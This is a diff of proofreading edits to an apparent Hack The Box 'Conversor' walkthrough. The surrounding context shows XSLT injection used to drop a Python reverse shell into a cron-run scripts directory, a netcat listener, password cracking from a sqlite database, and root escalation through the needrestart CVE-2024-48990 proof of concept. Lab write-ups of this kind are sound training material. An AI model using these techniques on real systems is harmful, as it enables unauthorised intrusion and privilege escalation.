@@ -34,18 +34,18 @@ OS and Service detection performed. Please report any incorrect results at https
 # Nmap done at Fri Jan 23 21:06:59 2026 -- 1 IP address (1 host up) scanned in 45.68 seconds
 ```
 - only two ports are open 22,80
-- On visting the http site we can see the domain, conversor.htb add it to /etc/hosts
+- On visiting the http site, we can see the domain, conversor.htb, and add it to /etc/hosts
 
 ```
 echo "10.129.3.35 conversor.htb" | sudo tee -a /etc/hosts
 ```
 ## User.txt
 
-- We can see a login page. Register your account and login to the site 
-- On visting the site we can see a site called conversor taking nmap scan results in xml format and use our choice of xslt template and transforms it into more pretty format.
+- We can see a login page. Register your account and log in to the site 
+- On visiting the site, we can see a site called conversor taking nmap scan results in xml format and using our choice of XSLT template and transforming it into a more pretty format.
 
-- In the endpoint **/about**, found the source code of the application .
-- download it and extract it to your local machine for investigation.
+- In the endpoint **/about**, found the source code of the application.
+- Download it and extract it to your local machine for investigation.
 
 ```
 tar -xvf source_code.tar.gz
@@ -87,14 +87,14 @@ def convert():
 ```
 from lxml import etree
 ```
-- You can see that the code is usgin xml.etree.ElementTree which is insecure if not implemente propery . which leads to execute xml. 
-- But in the above function **convert()** , the XMLparser was hardened 
+- You can see that the code is using xml.etree.ElementTree is insecure if not implemented properly, which leads to execute xml. 
+- But in the above function **convert()** , the XMLparser was hardened.
 ```
 parser = etree.XMLParser(resolve_entities=False, no_network=True, dtd_validation=False, load_dtd=False)
 ```
-- We cannot execute xml but the xslt parser was still vulnerable it we can execute xslt.
+- We cannot execute xml but the XSLT parser was still vulnerable; we can execute XSLT.
 
-- And also in the source code we dowloaded i found a files caled **install.md** .
+- And also in the source code we downloaded, I found a files caled **install.md**.
 
 ```
 If you want to run Python scripts (for example, our server deletes all files older than 60 minutes to avoid system overload), you can add the following line to your /etc/crontab.
@@ -102,12 +102,12 @@ If you want to run Python scripts (for example, our server deletes all files old
 """
 * * * * * www-data for f in /var/www/conversor.htb/scripts/*.py; do python3 "$f"; done
 ```
-- the user www-data is runnign a cron job . from the the above scripts directory once every minute. 
-- So my plan is to write a python revshell to that directory to gat a revshell.
-- I am going to use the abilyt of xslt to do this.
+- The user www-data is running a cron job. from the **/var/www/conversor.htb/scripts** directory once every minute. 
+- So I plan to write a Python reverse shell to a file in that directory. So that shell will get executed after 60 seconds.
+- I am going to use the ability of xslt to do this.
 
-- First we need two files xml and xslt . 
-- you can use any basic xml file.(I have saved my nmap scan into xml format using -oX option, i am goinf to use that).
+- First, we need two files XML and XSLT. 
+- You can use any basic XML file. (I have saved my nmap scan in xml format using -oX option, I am going to use that).
 
 - I crafted a xslt paylod
 ```
@@ -124,9 +124,9 @@ import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s
   </xsl:template>
 </xsl:stylesheet>
 ```
-- I saved it to shell.xslt and uploaded the file  to the server and started my listner .
+- I saved it to shell.xslt and uploaded the file  to the server, and also started my listener.
 
--After one minute i got he shell . 
+- After one minute, I got the shell. 
 
 ```
 nc -lnvp 4444
@@ -137,12 +137,12 @@ ls
 conversor.htb
 ```
 
-## Stabilizng the reverse shell
+## Stabilizing the reverse shell
 
 ```
 www-data@conversor:~$ python3 -c 'import pty;pty.spawn("/bin/bash")'
 ```
-- Hit enter then Crtl+Z
+- Hit enter, then Ctrl+Z
 ```
 www-data@conversor:~$ ^Z
 [1]  + 43757 suspended  nc -lnvp 4444
@@ -151,12 +151,12 @@ www-data@conversor:~$ ^Z
                                      export TERM=xterm
 www-data@conversor:~$ 
 ```
-- now we got better tty terminal can use arrows clear auto complete.
+- Now we got better tty terminal that can use arrows, clear, and auto-complete.
 
 ## Escalate to user fismathack
 
 - From the source code we can found a sqlite db under **/var/www/conversor.htb/instance/users.db**
-- I downloaded it to my local machine you can simple do it on the box too.
+- I downloaded it to my local machine. You can simply do it on the box, too.
 
 ```
 sqlite3 users.db                                                                   2m 4s
@@ -179,7 +179,7 @@ sqlite>
 ```
 ssh fismathack@conversor.htb
 ```
-- In the home directory we can find the **user.txt**
+- In the home directory, we can find the **user.txt**
 
 
 **User.txt: dbb8ffcdfe89746b17317a6e55223652**
@@ -198,7 +198,7 @@ User fismathack may run the following commands on conversor:
 ```
 
 - We can run **/usr/sbin/needrestart** as root without any password. 
-- On googling i found that this is vulnerable to local privilage escaltion.
+- On googling i found that this is vulnerable to local privilege escalation.
 - Check this [github](https://github.com/pentestfunctions/CVE-2024-48990-PoC-Testing) for POC.
 
 
@@ -228,7 +228,7 @@ echo "Bait process is running. Trigger 'sudo /usr/sbin/needrestart' in another s
 cd /tmp/malicious; PYTHONPATH="$PWD" python3 e.py 2>/dev/null
 ```
 
-***Note: the poc need to compile a c program but the box don't have gcc . so i compiled it in the lib.c on my machine and exported it to the box via http.***
+***Note: the poc need to compile a C program, but the box doesn't have gcc. So I compiled it in the lib.c on my machine and exported it to the box via http.***
 
 - lib.c file
 
@@ -279,7 +279,7 @@ chmod +x exploit.sh
 Bait process is running. Trigger 'sudo /usr/sbin/needrestart' in another shell.
 ```
 
-- On other terminal ssh to fismathack and run **sudo /usr/sbin/needrestart**
+- On another terminal, ssh to fismathack and run **sudo /usr/sbin/needrestart**
 
 ```
 fismathack@conversor:/tmp$ sudo /usr/share/needrestart/
